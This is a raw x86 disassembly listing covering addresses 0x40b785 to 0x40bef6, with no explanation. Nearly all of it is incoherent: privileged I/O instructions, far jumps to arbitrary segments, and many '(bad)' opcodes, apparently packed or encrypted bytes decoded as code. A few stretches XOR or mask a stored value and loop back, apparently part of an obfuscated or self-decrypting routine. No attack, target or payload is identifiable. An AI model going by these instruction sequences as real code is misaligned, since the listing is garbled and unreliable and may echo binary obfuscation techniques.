  40b785:	ins    BYTE PTR es:[edi],dx
  40b786:	and    eax,0x62bad40e
  40b78b:	cmp    ebp,edx
  40b78d:	pushf  
  40b78e:	ss pop edi
  40b790:	mov    dl,al
  40b792:	xchg   esp,eax
  40b793:	xchg   ecx,eax
  40b794:	xor    BYTE PTR [edx-0x10c0f816],bl
  40b79a:	ja     0x40b7e6
  40b79c:	push   ebp
  40b79d:	lods   al,BYTE PTR ds:[esi]
  40b79e:	mov    al,ds:0xa70b344e
  40b7a3:	add    eax,0x64dc391f
  40b7a8:	push   eax
  40b7a9:	and    eax,0x599ae5b6
  40b7ae:	mov    ds:0xcefbb212,al
  40b7b3:	fbstp  TBYTE PTR [esi-0x6d73b7ac]
  40b7b9:	out    0xf,eax
  40b7bb:	sub    bh,BYTE PTR [ebp+0x66bbefa2]
  40b7c1:	fist   DWORD PTR [edi-0x22]
  40b7c4:	inc    edi
  40b7c5:	pusha  
  40b7c6:	les    edx,FWORD PTR [edi+0x2]
  40b7c9:	sbb    DWORD PTR [ebx+edi*4-0x3104d7b0],eax
  40b7d0:	mov    DWORD PTR [ecx-0x5ca0caee],eax
  40b7d6:	dec    edi
  40b7d7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b7d8:	cmp    al,0x29
  40b7da:	shl    BYTE PTR [edi],cl
  40b7dc:	in     al,0x86
  40b7de:	dec    ebp
  40b7df:	mov    eax,ds:0x51dba875
  40b7e4:	int    0xe0
  40b7e6:	jns    0x40b7e8
  40b7e8:	dec    edx
  40b7e9:	dec    ebx
  40b7ea:	jo     0x40b7d3
  40b7ec:	inc    esp
  40b7ed:	mov    edi,ds
  40b7ef:	mov    ebx,0x27e1ae38
  40b7f4:	shr    DWORD PTR [ecx],cl
  40b7f6:	gs mov bl,bl
  40b7f9:	rol    DWORD PTR [esi-0x62],0x73
  40b7fd:	fiadd  WORD PTR [ebx]
  40b7ff:	push   esp
  40b800:	cwde   
  40b801:	stos   BYTE PTR es:[edi],al
  40b802:	dec    eax
  40b803:	push   es
  40b804:	add    ah,cl
  40b806:	fistp  DWORD PTR [edi+0x19]
  40b809:	jmp    0x8d43:0xa99d3ed8
  40b810:	scas   eax,DWORD PTR es:[edi]
  40b811:	shl    ebx,cl
  40b813:	cld    
  40b814:	mov    esp,0x640f7701
  40b819:	hlt    
  40b81a:	mov    ds:0xeea089ca,al
  40b81f:	push   ebx
  40b820:	fs std 
  40b822:	sub    eax,0x442e21cf
  40b827:	ds push 0x8d880c26
  40b82d:	into   
  40b82e:	stc    
  40b82f:	das    
  40b830:	lea    edx,[ebx-0x4a]
  40b833:	add    BYTE PTR [eax-0x7c],al
  40b836:	mov    BYTE PTR [ebx+0x1f0f0126],bl
  40b83c:	rcr    BYTE PTR [edx+0x5e662f39],cl
  40b842:	push   ecx
  40b843:	lahf   
  40b844:	add    ebx,DWORD PTR [ecx-0x28cf73c5]
  40b84a:	les    ecx,FWORD PTR [ebx]
  40b84c:	push   ds
  40b84d:	jmp    0x40b878
  40b84f:	imul   esp,DWORD PTR [ebx],0x893ca260
  40b855:	(bad)  
  40b856:	sub    al,0xf7
  40b858:	retf   0x1283
  40b85b:	lea    esp,[edi+0x3307be2f]
  40b861:	jecxz  0x40b856
  40b863:	fwait
  40b864:	retf   
  40b865:	adc    ebx,DWORD PTR [edi+ebx*2-0x7b]
  40b869:	add    DWORD PTR [esi-0x51],0x5c
  40b86d:	and    eax,0xabd3e854
  40b872:	int3   
  40b873:	pushf  
  40b874:	retf   0x833a
  40b877:	jns    0x40b88e
  40b879:	cwde   
  40b87a:	add    esi,DWORD PTR [eax-0x52]
  40b87d:	adc    esp,eax
  40b87f:	add    dl,BYTE PTR [ebx+0x2eec5c53]
  40b885:	mov    ebx,0xa515cb51
  40b88a:	sub    ebp,esp
  40b88c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b88d:	out    0x11,eax
  40b88f:	add    eax,0xe39403d6
  40b894:	mov    esi,0xe3c2d2bc
  40b899:	ins    BYTE PTR es:[edi],dx
  40b89a:	mov    dh,0xb7
  40b89c:	in     al,dx
  40b89d:	jp     0x40b878
  40b89f:	cmp    BYTE PTR [esp+edx*2-0x36d522af],bh
  40b8a6:	bound  esi,QWORD PTR [ecx-0x6a]
  40b8a9:	dec    edx
  40b8aa:	xchg   ebp,eax
  40b8ab:	or     ch,cl
  40b8ad:	call   0xc798:0x74dbeddc
  40b8b4:	adc    BYTE PTR [esi-0x31],bh
  40b8b7:	sbb    al,0x5
  40b8b9:	push   es
  40b8ba:	in     al,dx
  40b8bb:	mov    BYTE PTR [ecx+edi*1+0x282f4657],bl
  40b8c2:	sahf   
  40b8c3:	and    eax,0x406bcc15
  40b8c8:	iret   
  40b8c9:	out    dx,eax
  40b8ca:	inc    ebx
  40b8cb:	pop    ecx
  40b8cc:	jb     0x40b88d
  40b8ce:	ja     0x40b937
  40b8d0:	dec    esp
  40b8d1:	test   eax,0x491d5f79
  40b8d6:	bound  ebp,QWORD PTR [edx]
  40b8d8:	pop    ds
  40b8d9:	(bad)  
  40b8da:	in     al,0xac
  40b8dc:	mov    edi,0x8c15e641
  40b8e1:	outs   dx,BYTE PTR ds:[esi]
  40b8e2:	in     eax,dx
  40b8e3:	xchg   ecx,eax
  40b8e4:	(bad)  
  40b8e5:	aad    0x89
  40b8e7:	sub    DWORD PTR [ebp+0x118ad645],esi
  40b8ed:	push   esp
  40b8ee:	clc    
  40b8ef:	push   ss
  40b8f0:	push   esp
  40b8f1:	int3   
  40b8f2:	add    al,0xd2
  40b8f4:	jl     0x40b890
  40b8f6:	nop
  40b8f7:	mov    fs,edi
  40b8f9:	cmp    eax,0xe32f012f
  40b8fe:	push   esi
  40b8ff:	jo     0x40b91e
  40b901:	(bad)  
  40b903:	jmp    0x9e74fbb5
  40b908:	test   al,0x46
  40b90a:	inc    BYTE PTR [ebp-0x67fcfc39]
  40b910:	(bad)  
  40b911:	ds jns 0x40b8ae
  40b914:	cmp    eax,0x7b31a8c6
  40b919:	je     0x40bc46
  40b91f:	mov    eax,DWORD PTR [ebp-0x10]
  40b922:	and    DWORD PTR [eax],0x751c80
  40b928:	jmp    0x40b5e7
  40b92d:	jmp    0x40bc46
  40b932:	into   
  40b933:	aas    
  40b934:	ds ror ebp,0xc1
  40b938:	rcl    ebx,1
  40b93a:	add    esi,DWORD PTR [edi]
  40b93c:	stos   DWORD PTR es:[edi],eax
  40b93d:	shr    DWORD PTR [esi],cl
  40b93f:	outs   dx,BYTE PTR ds:[esi]
  40b940:	xor    DWORD PTR [edx+0x78788cc6],ebp
  40b946:	je     0x40b9c6
  40b948:	js     0x40b9c2
  40b94a:	iret   
  40b94b:	ds jo  0x40b8d1
  40b94e:	mov    ch,0x4b
  40b950:	jbe    0x40b986
  40b952:	jns    0x40b9c5
  40b954:	jne    0x40b8d7
  40b956:	imul   esi,DWORD PTR [esp+esi*4],0x617c3aa9
  40b95d:	dec    ebx
  40b95e:	enter  0xbbb6,0x8b
  40b962:	or     al,0x28
  40b964:	mov    ebp,0x14096cc6
  40b969:	add    dh,BYTE PTR [ecx]
  40b96b:	outs   dx,DWORD PTR ds:[esi]
  40b96c:	fwait
  40b96d:	adc    edx,esp
  40b96f:	mov    WORD PTR [edi+0x2f],ss
  40b972:	std    
  40b973:	(bad)  
  40b974:	mov    dl,0xed
  40b976:	jg     0x40b93e
  40b978:	lods   eax,DWORD PTR ds:[esi]
  40b979:	jo     0x40b96f
  40b97b:	xchg   dl,ch
  40b97d:	(bad)  
  40b97e:	push   edx
  40b97f:	sub    eax,0xc264aad8
  40b984:	shl    bl,0x6d
  40b987:	outs   dx,DWORD PTR ds:[esi]
  40b988:	(bad)  
  40b989:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b98a:	jge    0x40b9e7
  40b98c:	add    bh,BYTE PTR [edi-0x59]
  40b98f:	ja     0x40b98b
  40b991:	ror    BYTE PTR [eax+eax*4-0x17988a40],0x42
  40b999:	shl    ebx,1
  40b99b:	jnp    0x40b920
  40b99d:	cwde   
  40b99e:	xchg   esp,eax
  40b99f:	popa   
  40b9a0:	les    ebp,FWORD PTR [esi-0x4d]
  40b9a3:	call   0x4efa:0x14eb957
  40b9aa:	add    edi,ecx
  40b9ac:	sbb    cl,BYTE PTR [eax+0x269afc53]
  40b9b2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b9b3:	and    DWORD PTR ds:0xace5dc13,ebp
  40b9b9:	and    ebp,DWORD PTR [edi-0xea96d3e]
  40b9bf:	push   edx
  40b9c0:	xor    eax,0x14b0efab
  40b9c5:	mov    al,ds:0xc1515c83
  40b9ca:	cmp    ah,BYTE PTR [ebp+0x7fe40046]
  40b9d0:	mov    al,ds:0x7159c717
  40b9d5:	sbb    esp,DWORD PTR [edx]
  40b9d7:	mov    BYTE PTR [edx-0x51],cl
  40b9da:	jbe    0x40b9db
  40b9dc:	xchg   ecx,eax
  40b9dd:	adc    al,0x94
  40b9df:	nop
  40b9e0:	ds cmp eax,0x9e7082e8
  40b9e6:	jmp    0x40b9fd
  40b9e8:	inc    ebx
  40b9e9:	enter  0x2a0f,0x2f
  40b9ed:	retf   
  40b9ee:	mov    es,WORD PTR [ecx]
  40b9f0:	imul   ebx,DWORD PTR [ecx+0x6e],0x31b5623c
  40b9f7:	out    0x7b,al
  40b9f9:	nop
  40b9fa:	push   edi
  40b9fb:	imul   DWORD PTR [ebx+esi*4-0x780a9d52]
  40ba02:	jge    0x40b9cf
  40ba04:	lods   al,BYTE PTR ds:[esi]
  40ba05:	and    eax,0x8f4b701d
  40ba0a:	cmp    al,0x81
  40ba0c:	and    edi,esp
  40ba0e:	daa    
  40ba0f:	jo     0x40ba15
  40ba11:	lock xlat BYTE PTR ds:[ebx]
  40ba13:	xchg   esp,eax
  40ba14:	(bad)  
  40ba15:	loop   0x40ba45
  40ba17:	mov    ah,0x26
  40ba19:	adc    DWORD PTR [eax-0x1beed470],edx
  40ba1f:	push   es
  40ba20:	lods   eax,DWORD PTR ds:[esi]
  40ba21:	xchg   ebp,eax
  40ba22:	mov    dl,0x35
  40ba24:	imul   eax,DWORD PTR [ebx-0x7f],0x61d81cd8
  40ba2b:	pop    edi
  40ba2c:	sbb    eax,0xc9f43f15
  40ba31:	test   DWORD PTR [edi+ecx*2+0xf],eax
  40ba35:	push   cs
  40ba36:	cmp    edx,0xec9d6329
  40ba3c:	xor    al,0xd4
  40ba3e:	xchg   esi,eax
  40ba3f:	mov    edi,0x19b3b4dc
  40ba44:	lods   eax,DWORD PTR ds:[esi]
  40ba45:	jb     0x40ba60
  40ba47:	int3   
  40ba48:	loope  0x40ba00
  40ba4a:	pop    ebx
  40ba4b:	xor    ch,BYTE PTR [ecx-0x29]
  40ba4e:	or     edi,esi
  40ba50:	dec    esi
  40ba51:	int    0xfe
  40ba53:	stc    
  40ba54:	lds    eax,FWORD PTR [ecx+0x3f]
  40ba57:	xchg   BYTE PTR [esi+eiz*4],bl
  40ba5a:	les    ebx,FWORD PTR [ecx]
  40ba5c:	cmc    
  40ba5d:	mov    ecx,0xee46be8b
  40ba62:	popf   
  40ba63:	push   ds
  40ba64:	in     al,0xf4
  40ba66:	jns    0x40ba6f
  40ba68:	xor    BYTE PTR [ebx],al
  40ba6a:	or     DWORD PTR [ebx],0x3f
  40ba6d:	(bad)  
  40ba6f:	lods   eax,DWORD PTR ds:[esi]
  40ba70:	fld    QWORD PTR [ebp-0x8042559]
  40ba76:	out    0x30,al
  40ba78:	mov    DWORD PTR [edi],ebp
  40ba7a:	not    DWORD PTR [eax]
  40ba7c:	xor    ebx,DWORD PTR [esi]
  40ba7e:	jle    0x40ba15
  40ba80:	mov    esp,0x9b8681e1
  40ba85:	ret    
  40ba86:	bnd jmp 0x40bad6
  40ba89:	neg    DWORD PTR [eax-0x5d828800]
  40ba8f:	int3   
  40ba90:	or     al,0x91
  40ba92:	sub    ah,bl
  40ba94:	or     DWORD PTR [esi],0x31
  40ba97:	and    bh,BYTE PTR [esi-0x6b]
  40ba9a:	imul   BYTE PTR [edx-0x34fd4091]
  40baa0:	push   ss
  40baa1:	out    0xdf,eax
  40baa3:	test   al,0x8e
  40baa5:	jb     0x40ba5f
  40baa7:	sub    ah,BYTE PTR [ecx+0xf]
  40baaa:	push   ebx
  40baab:	pop    ss
  40baac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40baad:	pop    edi
  40baae:	js     0x40bac6
  40bab0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40bab1:	xchg   edx,eax
  40bab2:	xchg   ecx,eax
  40bab3:	push   cs
  40bab4:	retf   
  40bab5:	fdiv   DWORD PTR [ecx-0x5]
  40bab8:	icebp  
  40bab9:	inc    DWORD PTR [ebx+0x7a]
  40babc:	mov    ecx,0x728c1f9e
  40bac1:	lods   al,BYTE PTR ds:[esi]
  40bac2:	push   cs
  40bac3:	xchg   ebx,eax
  40bac4:	stc    
  40bac5:	js     0x40bad4
  40bac7:	adc    eax,0xb53fc9cd
  40bacc:	jmp    0xbd490885
  40bad1:	dec    esp
  40bad2:	and    eax,0x5e67fb0d
  40bad7:	jb     0x40ba9d
  40bad9:	or     esi,DWORD PTR [ecx+0x76]
  40badc:	cmp    eax,0xa12857b2
  40bae1:	push   ecx
  40bae2:	mov    bh,0x85
  40bae4:	(bad)  
  40bae5:	jmp    0x40bb2c
  40bae7:	xchg   ecx,eax
  40bae8:	dec    esi
  40bae9:	push   ecx
  40baea:	sub    BYTE PTR [eax+0x5c],al
  40baed:	or     eax,0xdab939f1
  40baf2:	fistp  QWORD PTR [eax]
  40baf4:	shl    BYTE PTR [ebp-0x70f3207e],1
  40bafa:	loopne 0x40badd
  40bafc:	dec    edi
  40bafd:	and    al,ch
  40baff:	jae    0x40bb76
  40bb01:	ins    BYTE PTR es:[edi],dx
  40bb02:	push   esp
  40bb03:	retf   
  40bb04:	cmp    DWORD PTR [eax],ebp
  40bb06:	mov    dl,0x9
  40bb08:	hlt    
  40bb09:	js     0x40bb4f
  40bb0b:	push   ebx
  40bb0c:	add    dl,BYTE PTR [edx-0x2d3b0852]
  40bb12:	repz fdiv st,st(5)
  40bb15:	repnz dec esp
  40bb17:	jl     0x40bb48
  40bb19:	and    al,0x6a
  40bb1b:	inc    eax
  40bb1c:	stc    
  40bb1d:	mov    dh,0x48
  40bb1f:	pop    eax
  40bb20:	sub    DWORD PTR [eax],esi
  40bb22:	(bad)  
  40bb23:	xor    ah,al
  40bb25:	int    0x8e
  40bb27:	repnz mov ds:0x8cb2779d,al
  40bb2d:	inc    esp
  40bb2e:	inc    esp
  40bb2f:	in     al,0xa7
  40bb31:	neg    DWORD PTR [ecx]
  40bb33:	fcom   QWORD PTR [edx]
  40bb35:	jmp    0x40bb44
  40bb37:	std    
  40bb38:	jp     0x40bb96
  40bb3a:	or     ecx,edi
  40bb3c:	adc    eax,0x9dbc1a70
  40bb41:	outs   dx,DWORD PTR ds:[esi]
  40bb42:	cmp    al,0x7a
  40bb44:	sahf   
  40bb45:	(bad)  [ebp-0x3f40edb4]
  40bb4b:	(bad)  
  40bb4c:	xor    eax,0x8954ce6e
  40bb51:	addr16 std 
  40bb53:	mov    al,ds:0x93082c2d
  40bb58:	test   al,0x27
  40bb5a:	xor    ch,cl
  40bb5c:	fstp   QWORD PTR [eax]
  40bb5e:	mov    dh,0xd2
  40bb60:	xor    dh,BYTE PTR [edx+eiz*4]
  40bb63:	xor    esp,DWORD PTR [ebp-0x8]
  40bb66:	mov    esi,ebx
  40bb68:	mov    al,0x35
  40bb6a:	(bad)  
  40bb6b:	stc    
  40bb6c:	xchg   esi,eax
  40bb6d:	push   0xffffff88
  40bb6f:	stos   BYTE PTR es:[edi],al
  40bb70:	fidiv  WORD PTR [edx+0x63987c2d]
  40bb76:	scas   al,BYTE PTR es:[edi]
  40bb77:	mov    esp,0x875d9dd3
  40bb7c:	adc    bl,dl
  40bb7e:	sub    ah,0xcb
  40bb81:	fist   DWORD PTR [edi-0x50c0f3d1]
  40bb87:	xchg   esp,eax
  40bb88:	inc    edx
  40bb89:	fwait
  40bb8a:	sub    eax,0x59a61689
  40bb8f:	push   ds
  40bb90:	repnz mov bh,0x58
  40bb93:	pop    ss
  40bb94:	outs   dx,DWORD PTR ds:[esi]
  40bb95:	sub    al,0xb8
  40bb97:	inc    ebx
  40bb98:	sbb    BYTE PTR [esi+0x1c],ch
  40bb9b:	dec    ebx
  40bb9c:	pop    ecx
  40bb9d:	out    0x22,al
  40bb9f:	cmp    DWORD PTR [esi-0x191e34aa],esp
  40bba5:	mov    eax,ds:0x2085cc9
  40bbaa:	pop    DWORD PTR [ebx+0x5f]
  40bbad:	dec    ebx
  40bbae:	pop    eax
  40bbaf:	enter  0xef36,0x5b
  40bbb3:	xchg   dx,ax
  40bbb5:	push   edx
  40bbb6:	pop    ss
  40bbb7:	xchg   ecx,eax
  40bbb8:	sbb    eax,esi
  40bbba:	aas    
  40bbbb:	popa   
  40bbbc:	ss in  al,dx
  40bbbe:	rcl    edx,0x1c
  40bbc1:	call   FWORD PTR [edx+0x23]
  40bbc4:	jb     0x40bb60
  40bbc6:	add    BYTE PTR [esi+0x20],bl
  40bbc9:	mov    fs,ebx
  40bbcb:	inc    edx
  40bbcc:	ficom  WORD PTR [edx]
  40bbce:	aaa    
  40bbcf:	sub    bl,BYTE PTR [edi-0x40eb29dc]
  40bbd5:	pop    edi
  40bbd6:	or     eax,0xea22b865
  40bbdb:	mov    al,0xc1
  40bbdd:	fmul   DWORD PTR [edi+0x32d4d372]
  40bbe3:	and    DWORD PTR [edx-0x3b],0x7d
  40bbe7:	push   ds
  40bbe8:	jl     0x40bba6
  40bbea:	(bad)  
  40bbeb:	in     al,0x84
  40bbed:	sahf   
  40bbee:	push   esi
  40bbef:	retf   0xd8c2
  40bbf2:	push   es
  40bbf3:	int    0x32
  40bbf5:	(bad)  
  40bbf6:	nop
  40bbf7:	inc    ecx
  40bbf8:	sub    ecx,DWORD PTR [esi+0x6eae7ddd]
  40bbfe:	fsub   QWORD PTR [edx+0x1e84d6ed]
  40bc04:	mov    edi,?
  40bc06:	cwde   
  40bc07:	xchg   DWORD PTR [ebp+ecx*4-0x15],edx
  40bc0b:	sar    DWORD PTR [edx+eax*2],0x72
  40bc0f:	push   eax
  40bc10:	(bad)  
  40bc11:	xchg   DWORD PTR [ebp+0x3f],esp
  40bc14:	pop    es
  40bc15:	(bad)  
  40bc16:	std    
  40bc17:	pusha  
  40bc18:	ss in  al,dx
  40bc1a:	pop    ss
  40bc1b:	xor    al,0x6c
  40bc1d:	push   edx
  40bc1e:	aaa    
  40bc1f:	mov    edx,0xf107349f
  40bc24:	adc    eax,0xfab72b3b
  40bc29:	outs   dx,BYTE PTR ds:[esi]
  40bc2a:	pop    eax
  40bc2b:	addr16 retf 
  40bc2d:	mov    ecx,0x198088ea
  40bc32:	in     eax,dx
  40bc33:	iret   
  40bc34:	xchg   DWORD PTR [esp+edx*4-0xa],edi
  40bc38:	cli    
  40bc39:	mov    ds:0xaf41e910,eax
  40bc3e:	fcmovb st,st(7)
  40bc40:	call   0x8bea:0xd8409b2d
  40bc47:	inc    ebp
  40bc48:	hlt    
  40bc49:	mov    edx,DWORD PTR [ebp-0x18]
  40bc4c:	or     eax,edx
  40bc4e:	cmp    eax,0xfa9f7e76
  40bc53:	je     0x40bc67
  40bc59:	mov    eax,DWORD PTR [ebp-0x10]
  40bc5c:	xor    DWORD PTR [eax],0x2650fa8e
  40bc62:	jmp    0x40b5e7
  40bc67:	mov    ax,WORD PTR [ebp-0x4]
  40bc6b:	jmp    0x40bf84
  40bc70:	(bad)  
  40bc71:	ds ret 
  40bc73:	ror    bl,cl
  40bc75:	rcl    ebp,1
  40bc77:	fisubr DWORD PTR [ebp+0x56]
  40bc7a:	xchg   esp,eax
  40bc7b:	jge    0x40bc32
  40bc7d:	push   0xffffff94
  40bc7f:	aaa    
  40bc80:	ret    0x7891
  40bc83:	js     0x40bcf9
  40bc85:	jle    0x40bcff
  40bc87:	js     0x40bcff
  40bc89:	mov    al,BYTE PTR [edi+0x1e]
  40bc8c:	cmp    DWORD PTR [ecx],esp
  40bc8e:	xchg   ebp,eax
  40bc8f:	addr16 pop ebx
  40bc91:	test   eax,0xfa247fb9
  40bc96:	test   BYTE PTR [esi-0x1fa30056],0x9
  40bc9d:	or     ebp,DWORD PTR [edi+0x27d9f5f1]
  40bca3:	stos   DWORD PTR es:[edi],eax
  40bca4:	lods   al,BYTE PTR ds:[esi]
  40bca5:	sub    edi,DWORD PTR [ecx+0x11]
  40bca8:	push   esp
  40bca9:	adc    esp,DWORD PTR [edx]
  40bcab:	idiv   BYTE PTR [edx]
  40bcad:	in     eax,0xff
  40bcaf:	lock (bad) [ecx+0x51]
  40bcb3:	push   0xfe756ce1
  40bcb8:	into   
  40bcb9:	jns    0x40bd0e
  40bcbb:	mov    esp,0x3d2eac15
  40bcc0:	data16 jmp 0x40bce3
  40bcc3:	mov    al,0x4f
  40bcc5:	(bad)  
  40bcc6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40bcc7:	mov    eax,0xd1acba7d
  40bccc:	loope  0x40bc88
  40bcce:	mov    ecx,0x787dc29c
  40bcd3:	mov    bl,0xee
  40bcd5:	repnz pop esi
  40bcd7:	jge    0x40bc8c
  40bcd9:	push   edi
  40bcda:	dec    edx
  40bcdb:	ror    DWORD PTR [ebx+0xf1e7042],0x55
  40bce2:	push   ds
  40bce3:	push   edx
  40bce4:	add    al,0x1f
  40bce6:	(bad)  
  40bce7:	scas   al,BYTE PTR es:[edi]
  40bce8:	lock (bad) 
  40bcea:	push   esp
  40bceb:	iret   
  40bcec:	jns    0x40bce1
  40bcee:	nop
  40bcef:	push   ecx
  40bcf0:	rcr    DWORD PTR [esi+0x33def20d],cl
  40bcf6:	pop    ecx
  40bcf7:	(bad)
  40bcfa:	xor    DWORD PTR [esi],ecx
  40bcfc:	push   ecx
  40bcfd:	or     ch,BYTE PTR [ecx]
  40bcff:	jns    0x40bd58
  40bd01:	repz xor bh,BYTE PTR [ebp+0x49]
  40bd05:	jmp    0x40bd4c
  40bd07:	inc    edi
  40bd08:	sbb    esp,edx
  40bd0a:	jno    0x40bd32
  40bd0c:	daa    
  40bd0d:	dec    ebx
  40bd0e:	(bad)  [esi]
  40bd10:	data16 lods al,BYTE PTR ds:[esi]
  40bd12:	fs pop ds
  40bd14:	mov    dl,0x82
  40bd16:	or     esp,DWORD PTR [ebx-0x17e08396]
  40bd1c:	leave  
  40bd1d:	mov    bh,0x83
  40bd1f:	fst    DWORD PTR [esi+0x14d23de3]
  40bd25:	shr    BYTE PTR [edx-0x45],0xf5
  40bd29:	loopne 0x40bd07
  40bd2b:	icebp  
  40bd2c:	mov    al,0x9
  40bd2e:	cmc    
  40bd2f:	cs (bad) 
  40bd31:	jno    0x40bd16
  40bd33:	xchg   esp,eax
  40bd34:	mov    cl,0x47
  40bd36:	mov    ds:0xee9e15a7,eax
  40bd3c:	enter  0x5a52,0xfe
  40bd40:	sar    DWORD PTR [ebx],0xe6
  40bd43:	fisub  WORD PTR [eax+0x45b99f92]
  40bd49:	out    0xa6,al
  40bd4b:	ret    
  40bd4c:	fbstp  TBYTE PTR [edi+0x93e4344]
  40bd52:	sbb    DWORD PTR [ebp+0x663c3650],ebx
  40bd58:	into   
  40bd59:	aad    0x2b
  40bd5b:	fnstcw WORD PTR [ecx-0x45d87728]
  40bd61:	jge    0x40bda4
  40bd63:	sub    al,0x8c
  40bd65:	cli    
  40bd66:	mov    ds:0xd26ee375,al
  40bd6b:	loopne 0x40bd8c
  40bd6d:	loop   0x40bd8c
  40bd6f:	(bad)  
  40bd70:	data16 rol BYTE PTR [edx],1
  40bd73:	ds retf 
  40bd75:	push   ss
  40bd76:	rol    BYTE PTR [eax+0x64f8c895],cl
  40bd7c:	pop    ds
  40bd7d:	sti    
  40bd7e:	scas   al,BYTE PTR es:[edi]
  40bd7f:	or     eax,0x981d8e62
  40bd84:	sub    al,0xe1
  40bd86:	inc    esi
  40bd87:	mov    bh,0x8
  40bd89:	in     eax,dx
  40bd8a:	test   al,0xf3
  40bd8c:	int3   
  40bd8d:	xlat   BYTE PTR ds:[ebx]
  40bd8e:	or     BYTE PTR [ebp-0x1b],al
  40bd91:	and    BYTE PTR [esp+ecx*4-0x36],0x64
  40bd96:	inc    edx
  40bd97:	jns    0x40bdf4
  40bd99:	outs   dx,DWORD PTR ds:[esi]
  40bd9a:	mov    bl,0xa9
  40bd9c:	dec    esp
  40bd9d:	xchg   esi,eax
  40bd9e:	add    al,0x55
  40bda0:	out    dx,eax
  40bda1:	mov    WORD PTR ds:0x8f30070a,gs
  40bda7:	pop    ebx
  40bda8:	sbb    DWORD PTR [ebx+0x6],ebp
  40bdab:	sbb    eax,0x9b0dd10a
  40bdb0:	adc    cl,BYTE PTR [eax]
  40bdb2:	and    al,0x7d
  40bdb4:	adc    DWORD PTR [edi+ecx*4-0x2f],eax
  40bdb8:	mov    al,0x99
  40bdba:	fwait
  40bdbb:	mov    ds,WORD PTR [eax+0x4f08e5f2]
  40bdc1:	xor    bh,dl
  40bdc3:	lahf   
  40bdc4:	out    dx,eax
  40bdc5:	pop    edi
  40bdc6:	dec    ebp
  40bdc7:	ret    0x2170
  40bdca:	dec    eax
  40bdcb:	inc    edi
  40bdcc:	retf   0x85c3
  40bdcf:	sub    esp,esp
  40bdd1:	leave  
  40bdd2:	mov    ebp,0xfb506903
  40bdd7:	dec    ebx
  40bdd8:	call   0x1bb93ff
  40bddd:	ret    
  40bdde:	mov    ebx,edx
  40bde0:	xchg   esp,eax
  40bde1:	mov    al,0xb
  40bde3:	dec    edi
  40bde4:	pop    ss
  40bde5:	push   ebx
  40bde6:	jp     0x40be0e
  40bde8:	push   es
  40bde9:	or     DWORD PTR [edi+0x468ac55],esp
  40bdef:	retf   
  40bdf0:	mov    ss,ebx
  40bdf2:	data16 fcom DWORD PTR [eax-0x4a]
  40bdf6:	fidiv  DWORD PTR [ebx-0x50]
  40bdf9:	dec    esp
  40bdfa:	es dec eax
  40bdfc:	mov    al,0xc9
  40bdfe:	fldcw  WORD PTR [ecx+ebp*2+0x30cf52ff]
  40be05:	mov    edi,DWORD PTR [ebx+0x4780855a]
  40be0b:	inc    ebp
  40be0c:	mov    eax,0x25a103d3
  40be11:	xchg   DWORD PTR [edx-0x49f1e8c5],esp
  40be17:	mov    esp,0x3bb272a9
  40be1c:	cmp    al,0xd2
  40be1e:	mov    ebx,0xcaf0704b
  40be23:	imul   edx,DWORD PTR [ecx+0x2f],0xffffffbe
  40be27:	stos   BYTE PTR es:[edi],al
  40be28:	stos   DWORD PTR es:[edi],eax
  40be29:	iret   
  40be2a:	cmp    eax,0x189b4789
  40be2f:	xchg   esp,eax
  40be30:	(bad)  
  40be31:	outs   dx,DWORD PTR ds:[esi]
  40be32:	(bad)  
  40be33:	ffreep st(3)
  40be35:	ds daa 
  40be37:	mov    eax,0x25504d57
  40be3c:	mov    edx,DWORD PTR [ebp+0x30]
  40be3f:	xchg   ebx,eax
  40be40:	jmp    0x40be8d
  40be42:	add    BYTE PTR [esi-0x76],al
  40be45:	stos   DWORD PTR es:[edi],eax
  40be46:	fsubr  st,st(5)
  40be48:	mov    edx,0xfb7c4573
  40be4d:	sbb    ebp,edx
  40be4f:	mov    edi,0x5e342380
  40be54:	repnz pop ebx
  40be56:	dec    eax
  40be57:	loope  0x40bdf8
  40be59:	sub    ecx,DWORD PTR ds:0xb3179510
  40be5f:	sub    esp,DWORD PTR [ebx+eiz*8]
  40be62:	gs sbb eax,0x705556ff
  40be68:	mov    edx,0xa97879d1
  40be6d:	dec    esi
  40be6e:	jp     0x40bed5
  40be70:	test   DWORD PTR [esi-0x380c8aac],ebp
  40be76:	fnsave [eax+esi*2-0x13]
  40be7a:	xchg   esp,eax
  40be7b:	xchg   esi,eax
  40be7c:	cmp    DWORD PTR ds:0xa113165c,esp
  40be82:	mov    ebp,0xd4c9e59e
  40be87:	or     ebp,DWORD PTR [edx-0x2274ad84]
  40be8d:	(bad)  
  40be8e:	adc    BYTE PTR [eax+0x43e86f81],dl
  40be94:	lock and al,0xb9
  40be97:	jp     0x40bf14
  40be99:	or     al,0xf0
  40be9b:	or     al,0x62
  40be9d:	retf   
  40be9e:	mov    bh,ah
  40bea0:	pop    ebp
  40bea1:	outs   dx,BYTE PTR ds:[esi]
  40bea2:	arpl   cx,sp
  40bea4:	push   ebx
  40bea5:	test   edx,edi
  40bea7:	inc    esi
  40bea8:	inc    ebx
  40bea9:	arpl   dx,cx
  40beab:	fcom   DWORD PTR [eax-0x19767b2f]
  40beb1:	push   eax
  40beb2:	cld    
  40beb3:	jno    0x40bed6
  40beb5:	mov    ds:0xc6f528f9,eax
  40beba:	mov    al,ds:0x5fe685d
  40bebf:	ins    DWORD PTR es:[edi],dx
  40bec0:	fstp   DWORD PTR [edi]
  40bec2:	xor    eax,0x430e926a
  40bec7:	pop    esp
  40bec8:	ret    
  40bec9:	aad    0xf5
  40becb:	in     eax,0x88
  40becd:	jb     0x40bec7
  40becf:	lods   al,BYTE PTR ds:[esi]
  40bed0:	dec    edx
  40bed1:	(bad)  
  40bed3:	iret   
  40bed4:	add    bl,BYTE PTR [bx+di+0x40c1]
  40bed9:	sbb    DWORD PTR [edx+0x4a1a0eb6],ecx
  40bedf:	sbb    DWORD PTR [ebp+0x63cac17e],esi
  40bee5:	pop    ebp
  40bee6:	out    0x9,eax
  40bee8:	mov    bl,0x66
  40beea:	jp     0x40bf33
  40beec:	mov    esp,0x689bc9b2
  40bef1:	cmp    eax,0x3e0f63bb
  40bef6:	pop    ss
